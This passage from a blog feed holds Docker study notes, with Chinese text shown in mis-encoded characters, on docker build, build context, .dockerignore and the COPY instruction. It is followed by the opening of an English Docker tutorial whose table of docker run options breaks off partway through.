ä¹‹ä¸€ï¼Œå°±æ˜¯å¿˜è®°äº†æ¯ä¸€å±‚æ„å»ºçš„æœ€åä¸€å®šè¦æ¸…ç†æ‰æ— å…³æ–‡ä»¶ã€‚</p></div><h2 id="æ„å»ºé•œåƒ">æ„å»ºé•œåƒ</h2><div class="story post-story"><p>å¥½äº†ï¼Œè®©æˆ‘ä»¬å†å›åˆ°ä¹‹å‰å®šåˆ¶çš„ nginx é•œåƒçš„ Dockerfile æ¥ã€‚ç°åœ¨æˆ‘ä»¬æ˜ç™½äº†è¿™ä¸ª Dockerfile çš„å†…å®¹ï¼Œé‚£ä¹ˆè®©æˆ‘ä»¬æ¥æ„å»ºè¿™ä¸ªé•œåƒå§ã€‚</p><p>åœ¨ <code>Dockerfile</code> æ–‡ä»¶æ‰€åœ¨ç›®å½•æ‰§è¡Œï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ docker build -t nginx:v3 <span class="token builtin class-name">.</span>Sending build context to Docker daemon <span class="token number">2.048</span> kBStep <span class="token number">1</span> <span class="token builtin class-name">:</span> FROM nginx ---<span class="token operator">></span> e43d811ce2f4Step <span class="token number">2</span> <span class="token builtin class-name">:</span> RUN <span class="token builtin class-name">echo</span> <span class="token string">'&lt;h1>Hello, Docker!&lt;/h1>'</span> <span class="token operator">></span> /usr/share/nginx/html/index.html ---<span class="token operator">></span> Running <span class="token keyword">in</span> 9cdc27646c7b ---<span class="token operator">></span> 44aa4490ce2cRemoving intermediate container 9cdc27646c7bSuccessfully built 44aa4490ce2c</code></pre><p>ä»å‘½ä»¤çš„è¾“å‡ºç»“æœä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ¸…æ™°çš„çœ‹åˆ°é•œåƒçš„æ„å»ºè¿‡ç¨‹ã€‚åœ¨ <code>Step 2</code> ä¸­ï¼Œå¦‚åŒæˆ‘ä»¬ä¹‹å‰æ‰€è¯´çš„é‚£æ ·ï¼Œ<code>RUN</code> æŒ‡ä»¤å¯åŠ¨äº†ä¸€ä¸ªå®¹å™¨ <code>9cdc27646c7b</code>ï¼Œæ‰§è¡Œäº†æ‰€è¦æ±‚çš„å‘½ä»¤ï¼Œå¹¶æœ€åæäº¤äº†è¿™ä¸€å±‚ <code>44aa4490ce2c</code>ï¼Œéšååˆ é™¤äº†æ‰€ç”¨åˆ°çš„è¿™ä¸ªå®¹å™¨ <code>9cdc27646c7b</code>ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨äº† <code>docker build</code> å‘½ä»¤è¿›è¡Œé•œåƒæ„å»ºã€‚å…¶æ ¼å¼ä¸ºï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">docker build <span class="token punctuation">[</span>é€‰é¡¹<span class="token punctuation">]</span> <span class="token operator">&lt;</span>ä¸Šä¸‹æ–‡è·¯å¾„/URL/-<span class="token operator">></span></code></pre><p>åœ¨è¿™é‡Œæˆ‘ä»¬æŒ‡å®šäº†æœ€ç»ˆé•œåƒçš„åç§° <code>-t nginx:v3</code>ï¼Œæ„å»ºæˆåŠŸåï¼Œæˆ‘ä»¬å¯ä»¥åƒä¹‹å‰è¿è¡Œ <code>nginx:v2</code> é‚£æ ·æ¥è¿è¡Œè¿™ä¸ªé•œåƒï¼Œå…¶ç»“æœä¼šå’Œ <code>nginx:v2</code> ä¸€æ ·ã€‚</p></div><h2 id="é•œåƒæ„å»ºä¸Šä¸‹æ–‡ï¼ˆContextï¼‰">é•œåƒæ„å»ºä¸Šä¸‹æ–‡ï¼ˆContextï¼‰</h2><div class="story post-story"><p>å¦‚æœæ³¨æ„ï¼Œä¼šçœ‹åˆ° <code>docker build</code> å‘½ä»¤æœ€åæœ‰ä¸€ä¸ª <code>.</code>ã€‚<code>.</code> è¡¨ç¤ºå½“å‰ç›®å½•ï¼Œè€Œ <code>Dockerfile</code> å°±åœ¨å½“å‰ç›®å½•ï¼Œå› æ­¤ä¸å°‘åˆå­¦è€…ä»¥ä¸ºè¿™ä¸ªè·¯å¾„æ˜¯åœ¨æŒ‡å®š <code>Dockerfile</code> æ‰€åœ¨è·¯å¾„ï¼Œè¿™ä¹ˆç†è§£å…¶å®æ˜¯ä¸å‡†ç¡®çš„ã€‚å¦‚æœå¯¹åº”ä¸Šé¢çš„å‘½ä»¤æ ¼å¼ï¼Œä½ å¯èƒ½ä¼šå‘ç°ï¼Œè¿™æ˜¯åœ¨æŒ‡å®š <strong>ä¸Šä¸‹æ–‡è·¯å¾„</strong>ã€‚é‚£ä¹ˆä»€ä¹ˆæ˜¯ä¸Šä¸‹æ–‡å‘¢ï¼Ÿ</p><p>é¦–å…ˆæˆ‘ä»¬è¦ç†è§£ <code>docker build</code> çš„å·¥ä½œåŸç†ã€‚Docker åœ¨è¿è¡Œæ—¶åˆ†ä¸º Docker å¼•æ“ï¼ˆä¹Ÿå°±æ˜¯æœåŠ¡ç«¯å®ˆæŠ¤è¿›ç¨‹ï¼‰å’Œå®¢æˆ·ç«¯å·¥å…·ã€‚Docker çš„å¼•æ“æä¾›äº†ä¸€ç»„ REST APIï¼Œè¢«ç§°ä¸º <a href="https://docs.docker.com/develop/sdk/">Docker Remote API</a>ï¼Œè€Œå¦‚ <code>docker</code> å‘½ä»¤è¿™æ ·çš„å®¢æˆ·ç«¯å·¥å…·ï¼Œåˆ™æ˜¯é€šè¿‡è¿™ç»„ API ä¸ Docker å¼•æ“äº¤äº’ï¼Œä»è€Œå®Œæˆå„ç§åŠŸèƒ½ã€‚å› æ­¤ï¼Œè™½ç„¶è¡¨é¢ä¸Šæˆ‘ä»¬å¥½åƒæ˜¯åœ¨æœ¬æœºæ‰§è¡Œå„ç§ <code>docker</code> åŠŸèƒ½ï¼Œä½†å®é™…ä¸Šï¼Œä¸€åˆ‡éƒ½æ˜¯ä½¿ç”¨çš„è¿œç¨‹è°ƒç”¨å½¢å¼åœ¨æœåŠ¡ç«¯ï¼ˆDocker å¼•æ“ï¼‰å®Œæˆã€‚ä¹Ÿå› ä¸ºè¿™ç§ C/S è®¾è®¡ï¼Œè®©æˆ‘ä»¬æ“ä½œè¿œç¨‹æœåŠ¡å™¨çš„ Docker å¼•æ“å˜å¾—è½»è€Œæ˜“ä¸¾ã€‚</p><p>å½“æˆ‘ä»¬è¿›è¡Œé•œåƒæ„å»ºçš„æ—¶å€™ï¼Œå¹¶éæ‰€æœ‰å®šåˆ¶éƒ½ä¼šé€šè¿‡ <code>RUN</code> æŒ‡ä»¤å®Œæˆï¼Œç»å¸¸ä¼šéœ€è¦å°†ä¸€äº›æœ¬åœ°æ–‡ä»¶å¤åˆ¶è¿›é•œåƒï¼Œæ¯”å¦‚é€šè¿‡ <code>COPY</code> æŒ‡ä»¤ã€<code>ADD</code> æŒ‡ä»¤ç­‰ã€‚è€Œ <code>docker build</code> å‘½ä»¤æ„å»ºé•œåƒï¼Œå…¶å®å¹¶éåœ¨æœ¬åœ°æ„å»ºï¼Œè€Œæ˜¯åœ¨æœåŠ¡ç«¯ï¼Œä¹Ÿå°±æ˜¯ Docker å¼•æ“ä¸­æ„å»ºçš„ã€‚é‚£ä¹ˆåœ¨è¿™ç§å®¢æˆ·ç«¯/æœåŠ¡ç«¯çš„æ¶æ„ä¸­ï¼Œå¦‚ä½•æ‰èƒ½è®©æœåŠ¡ç«¯è·å¾—æœ¬åœ°æ–‡ä»¶å‘¢ï¼Ÿ</p><p>è¿™å°±å¼•å…¥äº†ä¸Šä¸‹æ–‡çš„æ¦‚å¿µã€‚å½“æ„å»ºçš„æ—¶å€™ï¼Œç”¨æˆ·ä¼šæŒ‡å®šæ„å»ºé•œåƒä¸Šä¸‹æ–‡çš„è·¯å¾„ï¼Œ<code>docker build</code> å‘½ä»¤å¾—çŸ¥è¿™ä¸ªè·¯å¾„åï¼Œä¼šå°†è·¯å¾„ä¸‹çš„æ‰€æœ‰å†…å®¹æ‰“åŒ…ï¼Œç„¶åä¸Šä¼ ç»™ Docker å¼•æ“ã€‚è¿™æ · Docker å¼•æ“æ”¶åˆ°è¿™ä¸ªä¸Šä¸‹æ–‡åŒ…åï¼Œå±•å¼€å°±ä¼šè·å¾—æ„å»ºé•œåƒæ‰€éœ€çš„ä¸€åˆ‡æ–‡ä»¶ã€‚</p><p>å¦‚æœåœ¨ <code>Dockerfile</code> ä¸­è¿™ä¹ˆå†™ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">COPY ./package.json /app/</code></pre><p>è¿™å¹¶ä¸æ˜¯è¦å¤åˆ¶æ‰§è¡Œ <code>docker build</code> å‘½ä»¤æ‰€åœ¨çš„ç›®å½•ä¸‹çš„ <code>package.json</code>ï¼Œä¹Ÿä¸æ˜¯å¤åˆ¶ <code>Dockerfile</code> æ‰€åœ¨ç›®å½•ä¸‹çš„ <code>package.json</code>ï¼Œè€Œæ˜¯å¤åˆ¶ <strong>ä¸Šä¸‹æ–‡ï¼ˆcontextï¼‰</strong> ç›®å½•ä¸‹çš„ <code>package.json</code>ã€‚</p><p>å› æ­¤ï¼Œ<code>COPY</code> è¿™ç±»æŒ‡ä»¤ä¸­çš„æºæ–‡ä»¶çš„è·¯å¾„éƒ½æ˜¯**<em>ç›¸å¯¹è·¯å¾„</em>ã€‚**è¿™ä¹Ÿæ˜¯åˆå­¦è€…ç»å¸¸ä¼šé—®çš„ä¸ºä»€ä¹ˆ <code>COPY ../package.json /app</code> æˆ–è€… <code>COPY /opt/xxxx /app</code> æ— æ³•å·¥ä½œçš„åŸå› ï¼Œå› ä¸ºè¿™äº›è·¯å¾„å·²ç»è¶…å‡ºäº†ä¸Šä¸‹æ–‡çš„èŒƒå›´ï¼ŒDocker å¼•æ“æ— æ³•è·å¾—è¿™äº›ä½ç½®çš„æ–‡ä»¶ã€‚å¦‚æœçœŸçš„éœ€è¦é‚£äº›æ–‡ä»¶ï¼Œåº”è¯¥å°†å®ƒä»¬å¤åˆ¶åˆ°ä¸Šä¸‹æ–‡ç›®å½•ä¸­å»ã€‚</p><p>ç°åœ¨å°±å¯ä»¥ç†è§£åˆšæ‰çš„å‘½ä»¤ <code>docker build -t nginx:v3 .</code> ä¸­çš„è¿™ä¸ª <code>.</code>ï¼Œå®é™…ä¸Šæ˜¯åœ¨æŒ‡å®šä¸Šä¸‹æ–‡çš„ç›®å½•ï¼Œ<code>docker build</code> å‘½ä»¤ä¼šå°†è¯¥ç›®å½•ä¸‹çš„å†…å®¹æ‰“åŒ…äº¤ç»™ Docker å¼•æ“ä»¥å¸®åŠ©æ„å»ºé•œåƒã€‚</p><p>å¦‚æœè§‚å¯Ÿ <code>docker build</code> è¾“å‡ºï¼Œæˆ‘ä»¬å…¶å®å·²ç»çœ‹åˆ°äº†è¿™ä¸ªå‘é€ä¸Šä¸‹æ–‡çš„è¿‡ç¨‹ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ docker build -t nginx:v3 .Sending build context to Docker daemon <span class="token number">2.048</span> kB<span class="token punctuation">..</span>.</code></pre><p>ç†è§£æ„å»ºä¸Šä¸‹æ–‡å¯¹äºé•œåƒæ„å»ºæ˜¯å¾ˆé‡è¦çš„ï¼Œé¿å…çŠ¯ä¸€äº›ä¸åº”è¯¥çš„é”™è¯¯ã€‚æ¯”å¦‚æœ‰äº›åˆå­¦è€…åœ¨å‘ç° <code>COPY /opt/xxxx /app</code> ä¸å·¥ä½œåï¼Œäºæ˜¯å¹²è„†å°† <code>Dockerfile</code> æ”¾åˆ°äº†ç¡¬ç›˜æ ¹ç›®å½•å»æ„å»ºï¼Œç»“æœå‘ç° <code>docker build</code> æ‰§è¡Œåï¼Œåœ¨å‘é€ä¸€ä¸ªå‡ å GB çš„ä¸œè¥¿ï¼Œæä¸ºç¼“æ…¢è€Œä¸”å¾ˆå®¹æ˜“æ„å»ºå¤±è´¥ã€‚é‚£æ˜¯å› ä¸ºè¿™ç§åšæ³•æ˜¯åœ¨è®© <code>docker build</code> æ‰“åŒ…æ•´ä¸ªç¡¬ç›˜ï¼Œè¿™æ˜¾ç„¶æ˜¯ä½¿ç”¨é”™è¯¯ã€‚</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œåº”è¯¥ä¼šå°† <code>Dockerfile</code> ç½®äºä¸€ä¸ªç©ºç›®å½•ä¸‹ï¼Œæˆ–è€…é¡¹ç›®æ ¹ç›®å½•ä¸‹ã€‚å¦‚æœè¯¥ç›®å½•ä¸‹æ²¡æœ‰æ‰€éœ€æ–‡ä»¶ï¼Œé‚£ä¹ˆåº”è¯¥æŠŠæ‰€éœ€æ–‡ä»¶å¤åˆ¶ä¸€ä»½è¿‡æ¥ã€‚å¦‚æœç›®å½•ä¸‹æœ‰äº›ä¸œè¥¿ç¡®å®ä¸å¸Œæœ›æ„å»ºæ—¶ä¼ ç»™ Docker å¼•æ“ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨ <code>.gitignore</code> ä¸€æ ·çš„è¯­æ³•å†™ä¸€ä¸ª <code>.dockerignore</code>ï¼Œè¯¥æ–‡ä»¶æ˜¯ç”¨äºå‰”é™¤ä¸éœ€è¦ä½œä¸ºä¸Šä¸‹æ–‡ä¼ é€’ç»™ Docker å¼•æ“çš„ã€‚</p><p>é‚£ä¹ˆä¸ºä»€ä¹ˆä¼šæœ‰äººè¯¯ä»¥ä¸º <code>.</code> æ˜¯æŒ‡å®š <code>Dockerfile</code> æ‰€åœ¨ç›®å½•å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœä¸é¢å¤–æŒ‡å®š <code>Dockerfile</code> çš„è¯ï¼Œä¼šå°†ä¸Šä¸‹æ–‡ç›®å½•ä¸‹çš„åä¸º <code>Dockerfile</code> çš„æ–‡ä»¶ä½œä¸º Dockerfileã€‚</p><p>è¿™åªæ˜¯é»˜è®¤è¡Œä¸ºï¼Œå®é™…ä¸Š <code>Dockerfile</code> çš„æ–‡ä»¶åå¹¶ä¸è¦æ±‚å¿…é¡»ä¸º <code>Dockerfile</code>ï¼Œè€Œä¸”å¹¶ä¸è¦æ±‚å¿…é¡»ä½äºä¸Šä¸‹æ–‡ç›®å½•ä¸­ï¼Œæ¯”å¦‚å¯ä»¥ç”¨ <code>-f ../Dockerfile.php</code> å‚æ•°æŒ‡å®šæŸä¸ªæ–‡ä»¶ä½œä¸º <code>Dockerfile</code>ã€‚</p><p>å½“ç„¶ï¼Œä¸€èˆ¬å¤§å®¶ä¹ æƒ¯æ€§çš„ä¼šä½¿ç”¨é»˜è®¤çš„æ–‡ä»¶å <code>Dockerfile</code>ï¼Œä»¥åŠä¼šå°†å…¶ç½®äºé•œåƒæ„å»ºä¸Šä¸‹æ–‡ç›®å½•ä¸­ã€‚</p></div><h2 id="COPY-å¤åˆ¶æ–‡ä»¶">COPY å¤åˆ¶æ–‡ä»¶</h2><div class="story post-story"><p>æ ¼å¼ï¼š</p><ul><li><code>COPY [--chown=&lt;user&gt;:&lt;group&gt;] &lt;æºè·¯å¾„&gt;... &lt;ç›®æ ‡è·¯å¾„&gt;</code></li><li><code>COPY [--chown=&lt;user&gt;:&lt;group&gt;] [&quot;&lt;æºè·¯å¾„1&gt;&quot;,... &quot;&lt;ç›®æ ‡è·¯å¾„&gt;&quot;]</code></li></ul><p>å’Œ <code>RUN</code> æŒ‡ä»¤ä¸€æ ·ï¼Œä¹Ÿæœ‰ä¸¤ç§æ ¼å¼ï¼Œä¸€ç§ç±»ä¼¼äºå‘½ä»¤è¡Œï¼Œä¸€ç§ç±»ä¼¼äºå‡½æ•°è°ƒç”¨ã€‚</p><p><code>COPY</code> æŒ‡ä»¤å°†ä»æ„å»ºä¸Šä¸‹æ–‡ç›®å½•ä¸­ <code>&lt;æºè·¯å¾„&gt;</code> çš„æ–‡ä»¶/ç›®å½•å¤åˆ¶åˆ°æ–°çš„ä¸€å±‚çš„é•œåƒå†…çš„ <code>&lt;ç›®æ ‡è·¯å¾„&gt;</code> ä½ç½®ã€‚æ¯”å¦‚ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">COPY package.json /usr/src/app/</code></pre><p><code>&lt;æºè·¯å¾„&gt;</code> å¯ä»¥æ˜¯å¤šä¸ªï¼Œç”šè‡³å¯ä»¥æ˜¯é€šé…ç¬¦ï¼Œå…¶é€šé…ç¬¦è§„åˆ™è¦æ»¡è¶³ Go çš„ <a href="https://golang.org/pkg/path/filepath/#Match"><code>filepath.Match</code></a> è§„åˆ™ï¼Œå¦‚ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">COPY hom* /mydir/COPY hom?.txt /mydir/</code></pre><p><code>&lt;ç›®æ ‡è·¯å¾„&gt;</code> å¯ä»¥æ˜¯å®¹å™¨å†…çš„ç»å¯¹è·¯å¾„ï¼Œä¹Ÿå¯ä»¥æ˜¯ç›¸å¯¹äºå·¥ä½œç›®å½•çš„ç›¸å¯¹è·¯å¾„ï¼ˆå·¥ä½œç›®å½•å¯ä»¥ç”¨ <code>WORKDIR</code> æŒ‡ä»¤æ¥æŒ‡å®šï¼‰ã€‚ç›®æ ‡è·¯å¾„ä¸éœ€è¦äº‹å…ˆåˆ›å»ºï¼Œå¦‚æœç›®å½•ä¸å­˜åœ¨ä¼šåœ¨å¤åˆ¶æ–‡ä»¶å‰å…ˆè¡Œåˆ›å»ºç¼ºå¤±ç›®å½•ã€‚</p><p>æ­¤å¤–ï¼Œè¿˜éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œä½¿ç”¨ <code>COPY</code> æŒ‡ä»¤ï¼Œæºæ–‡ä»¶çš„å„ç§å…ƒæ•°æ®éƒ½ä¼šä¿ç•™ã€‚æ¯”å¦‚è¯»ã€å†™ã€æ‰§è¡Œæƒé™ã€æ–‡ä»¶å˜æ›´æ—¶é—´ç­‰ã€‚è¿™ä¸ªç‰¹æ€§å¯¹äºé•œåƒå®šåˆ¶å¾ˆæœ‰ç”¨ã€‚ç‰¹åˆ«æ˜¯æ„å»ºç›¸å…³æ–‡ä»¶éƒ½åœ¨ä½¿ç”¨ Git è¿›è¡Œç®¡ç†çš„æ—¶å€™ã€‚</p><p>åœ¨ä½¿ç”¨è¯¥æŒ‡ä»¤çš„æ—¶å€™è¿˜å¯ä»¥åŠ ä¸Š <code>--chown=&lt;user&gt;:&lt;group&gt;</code> é€‰é¡¹æ¥æ”¹å˜æ–‡ä»¶çš„æ‰€å±ç”¨æˆ·åŠæ‰€å±ç»„ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">COPY --chown<span class="token operator">=</span><span class="token number">55</span>:mygroup files* /mydir/COPY --chown<span class="token operator">=</span>bin files* /mydir/COPY --chown<span class="token operator">=</span><span class="token number">1</span> files* /mydir/COPY --chown<span class="token operator">=</span><span class="token number">10</span>:11 files* /mydir/</code></pre><p><strong>å¦‚æœæºè·¯å¾„ä¸ºæ–‡ä»¶å¤¹ï¼Œå¤åˆ¶çš„æ—¶å€™ä¸æ˜¯ç›´æ¥å¤åˆ¶è¯¥æ–‡ä»¶å¤¹ï¼Œè€Œæ˜¯å°†æ–‡ä»¶å¤¹ä¸­çš„å†…å®¹å¤åˆ¶åˆ°ç›®æ ‡è·¯å¾„ã€‚</strong></p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
            <tag> æŠ€æœ¯å‘ </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker Tutorial</title>
      <link href="/posts/ac15f71a/"/>
      <url>/posts/ac15f71a/</url>
      
        <content type="html"><![CDATA[<h1>Docker Tutorial</h1><blockquote><p>ğŸ˜„ @Auther: sizaif</p><p>ğŸ“† 2021-06-08  15:38:53</p></blockquote><p>[TOC]</p><h2 id="docker-docs">docker docs</h2><div class="story post-story"><p><a href="https://docs.docker.com/get-docker/">https://docs.docker.com/get-docker/</a></p></div><h2 id="Install-Docker-Desktop-for-Windows">Install Docker Desktop for Windows</h2><div class="story post-story"><p><a href="https://docs.docker.com/docker-for-windows/install/">https://docs.docker.com/docker-for-windows/install/</a></p></div><h2 id="overview">overview</h2><div class="story post-story"><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210608153924.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210608153924.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210608153922856"></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210608154100.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210608154100.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210608154058225"></p></div><h2 id="Commands">Commands</h2><div class="story post-story"><p><a href="https://docs.docker.com/engine/reference/commandline/cli/">https://docs.docker.com/engine/reference/commandline/cli/</a></p></div><h2 id="Build">Build</h2><div class="story post-story"><pre class="language-bash" data-language="bash"><code class="language-bash">$ docker build <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> <span class="token environment constant">PATH</span> <span class="token operator">|</span> URL <span class="token operator">|</span> -</code></pre></div><h2 id="Run">Run</h2><div class="story post-story"><p><strong>Usage</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ docker run <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> IMAGE <span class="token punctuation">[</span>COMMAND<span class="token punctuation">]</span> <span class="token punctuation">[</span>ARG<span class="token punctuation">..</span>.<span class="token punctuation">]</span></code></pre></div><h2 id="Options">Options</h2><div class="story post-story"><details blue><summary> options </summary>              <div class='content'>              <table><thead><tr><th>Name, shorthand</th><th>Default</th><th>Description</th></tr></thead><tbody><tr><td><code>--add-host</code></td><td></td><td>Add a custom host-to-IP mapping (host:ip)</td></tr><tr><td><code>--attach</code> , <code>-a</code></td><td></td><td>Attach to STDIN, STDOUT or STDERR</td></tr><tr><td><code>--blkio-weight</code></td><td></td><td>Block IO (relative weight), between 10 and 1000, or 0 to disable (default 0)</td></tr><tr><td><code>--blkio-weight-device</code></td><td></td><td>Block IO weight (relative device weight)</td></tr><tr><td><code>--cap-add</code></td><td></td><td>Add Linux capabilities</td></tr><tr><td><code>--cap-drop</code></td><td></td><td>Drop Linux capabilities</td></tr><tr><td><code>--cgroup-parent</code></td><td></td><td>Optional parent cgroup for the container</td></tr><tr><td><code>--cgroupns</code></td><td></td><td><a href="https://docs.docker.com/engine/api/v1.41/"><strong>API 1.41+</strong></a> Cgroup namespace to use (host|private) â€˜hostâ€™: Run the container in the Docker hostâ€™s cgroup namespace â€˜privateâ€™: Run the container in its own private cgroup namespace â€˜â€™: Use the cgroup namespace as configured by the default-cgroupns-mode option on the daemon (default)</td></tr><tr><td><code>--cidfile</code></td><td></td><td>Write the container ID to the file</td></tr><tr><td><code>--cpu-count</code></td><td></td><td>CPU count (Windows only)</td></tr><tr><td><code>--cpu-percent</code></td><td></td><td>CPU percent (Windows only)</td></tr><tr><td><code>--cpu-period</code></td><td></td><td>Limit CPU CFS (Completely Fair Scheduler) period</td></tr><tr><td><code>--cpu-quota</code></td><td></td><td>Limit CPU CFS (Completely Fair Scheduler) quota</td></tr><tr><td><code>--cpu-rt-period</code></td><td></td><td><a href="https://docs.docker.com/engine/api/v1.25/"><strong>API 1.25+</strong></a> Limit CPU real-time period in microseconds</td></tr><tr><td><code>--cpu-rt-runtime</code></td><td></td><td><a href="https://docs.docker.com/engine/api/v1.25/"><strong>API 1.25+</strong></a> Limit CPU real-time runtime in microseconds</td></tr><tr><td><code>--cpu-shares</code> , <code>-c</code></td><td></td><td>CPU shares (relative weight)</td></tr><tr><td><code>--cpus</code></td><td></td><td><a href="https://docs.docker.com/engine/api/v1.25/"><strong>API 1.25+</strong></a> Number of CPUs</td></tr><tr><td><code>--cpuset-cpus</code></td><td></td><td>CPUs in which to allow execution (0-3, 0,1)</td></tr><tr><td><code>--cpuset-mems</code></td><td></td><td>MEMs in which to allow execution (0-3, 0,1)</td></tr><tr><td><code>--detach</code> , <code>-d</code></td><td></td><td>Run container in background and print container ID</td></tr><tr><td><code>--detach-keys</code></td><td></td><td>Override the key sequence for detaching a container</td></tr><tr><td><code>--device</code></td><td></td><td>Add a host device to the container</td></tr><tr><td><code>--device-cgroup-rule</code></td><td></td><td>Add a rule to the cgroup allowed devices list</td></tr><tr><td><code>--device-read-bps</code></td><td></td><td>Limit read rate (bytes per second) from a device</td></tr><tr><td><code>--device-read-iops</code></td><td></td><td>Limit read rate (IO per second) from a device</td></tr><tr><td><code>--device-write-bps</code></td><td></td><td>Limit write rate (bytes per second) to a device</td></tr><tr><td><code>--device-write-iops</code></td><td></td><td>Limit write rate (IO per second) to a device</td></tr><tr><td><code>--disable-content-trust</code></td><td><code>true</code></td><td>Skip image verification</td></tr><tr><td><code>--dns</code></td><td></td><td>Set custom DNS servers</td></tr><tr><td><code>--dns-opt</code></td><td></td><td>Set DNS options</td></tr><tr><td><code>--dns-option</code></td><td></td><td>Set DNS options</td></tr><tr><td><code>--dns-search</code></td><td></td><td>Set custom DNS search domains</td></tr><tr><td><code>--domainname</code></td><td></td><td>Container NIS domain name</td></tr><tr><td><code>--entrypoint</code></td><td></td><td>Overwrite the default ENTRYPOINT of the image</td></tr><tr><td><code>--env</code> , <code>-e</code></td><td></td><td>Set environment variables</td></tr><tr><td><code>--env-file</code></td><td></td><td>Read in a file of environment variables</td></tr><tr><td><code>--expose</code></td><td></td><td>Expose a port or a range of ports</td></tr><tr><td><code>--gpus</code></td><td></td><td><a href="https://docs.docker.com/engine/api/v1.40/"><strong>API 1.40+</strong></a> GPU devices to add to the container (â€˜allâ€™ to pass all GPUs)</td></tr><tr><td><code>--group-add</code></td><td></td><td>Add additional groups to join</td></tr><tr><td><code>--health-cmd</code></td><td></td><td>Command to run to check health</td></tr><tr><td><code>--health-interval</code></td><td></td><td>Time between running the check (ms|s|m|h) (default 0s)</td></tr><tr><td><code>--health-retries</code></td><td></td><td>Consecutive failures needed to report unhealthy</td></tr><tr><td><code>--health-start-period</code></td><td></td><td><a href="https://docs.docker.com/engine/api/v1.29/"><strong>API 1.29+</strong></a> Start period for the container to initialize before starting health-retries countdown (ms|s|m|h) (default 0s)</td></tr><tr><td><code>--health-timeout</code></td><td></td><td>Maximum time to allow one check to run (ms|s|m|h) (default 0s)</td></tr><tr><td><code>--help</code></td><td></td><td>Print usage</td></tr><tr><td><code>--hostname</code> , <code>-h</code></td><td></td><td>Container host name</td></tr><tr><td><code>--init</code></td><td></td><td><a href="https://docs.docker.com/engine/api/v1.25/"><strong>API 1.25+</strong></a> Run an init inside the container that forwards signals and reaps processes</td></tr><tr><td><code>--interactive</code> , <code>-i</code></td><td></td><td>Keep STDIN open even if not attached</td></tr><tr><td><code>--io-maxbandwidth</code></td><td></td><td>Maximum IO bandwidth limit for the system drive (Windows only)</td></tr><tr><td><code>--io-maxiops</code></td><td></td><td>Maximum IOps limit for the system drive (Windows only)</td></tr><tr><td><code>--ip</code></td><td></td><td>IPv4 address (e.g., 172.30.100.104)</td></tr><tr><td><code>--ip6</code></td><td></td><td>IPv6 address (e.g., 2001:db8::33)</td></tr><tr><td><code>--ipc</code></td><td></td><td>IPC mode to use</td></tr><tr><td><code>--isolation</code></td><td></td><td>Container isolation technology</td></tr><tr><td><code>--kernel-memory</code></td><td></td><td>Kernel memory limit</td></tr><tr><td><code>--label</code> , <code>-l</code></td><td></td><td>Set meta data on a container</td></tr><tr><td><code>--label-file</code></td><td></td><td>Read in a line delimited file of labels</td></tr><tr><td><code>--link</code></td><td></td><td>Add link to another container</td></tr><tr><td><code>--link-local-ip</code></td><td></td><td>Container IPv4/IPv6 link-local addresses</td></tr><tr><td><code>--log-driver</code></td><td></td><td>Logging driver for the container</td></tr><tr><td><code>--log-opt</code></td><td></td><td>Log driver options</td></tr><tr><td><code>--mac-address</code></td><td></td><td>Container MAC address (e.g., 92:d0:c6:0a:29:33)</td></tr><tr><td><code>--memory</code> , <code>-m</code></td><td></td><td>Memory limit</td></tr><tr><td><code>--memory-reservation</code></td><td></td><td>Memory soft limit</td></tr><tr><td><code>--memory-swap</code></td><td></td><td>Swap limit equal to memory plus swap: â€˜-1â€™ to enable unlimited swap</td></tr><tr><td><code>--memory-swappiness</code></td><td><code>-1</code></td><td>Tune container memory swappiness (0 to 100)</td></tr><tr><td><code>--mount</code></td><td></td><td>Attach a filesystem mount to the container</td></tr><tr><td><code>--name</code></td><td></td><td>Assign a name to the container</td></tr><tr><td><code>--net</code></td><td></td><td>Connect a container to a network</td></tr><tr><td><code>--net-alias</code></td><td></td><td>Add network-scoped alias for the container</td></tr><tr><td><code>--network</code></td><td></td><td>Connect a container to a network</td></tr><tr><td><code>--network-alias</code></td><td></td><td>Add network-scoped alias for the container</td></tr><tr><td><code>--no-healthcheck</code></td><td></td><td>Disable any container-specified HEALTHCHECK</td></tr><tr><td><code>--oom-kill-disable</code></td><td></td><td>Disable OOM Killer</td></tr><tr><td><code>--oom-score-adj</code></td><td></td><td>Tune hostâ€™s OOM preferences (-1000 to 1000)</td></tr><tr><td><code>--pid</code></td><td></td><td>PID namespace to use</td></tr><tr><td><code>--pids-limit</code></td><td></td><td>Tune container pids limit (set -1 for unlimited)</td></tr><tr><td><code>--platform</code></td><td></td><td><a href="https://docs.docker.com/engine/api/v1.32/"><strong>API 1.32+</strong></a> Set platform if server is multi-platform capable</td></tr><tr><td><code>--privileged</code></td><td></td><td>Give extended privileges to this container</td></tr><tr><td><code>--publish</code> , <code>-p</code></td><td></td><td>Publish a containerâ€™s 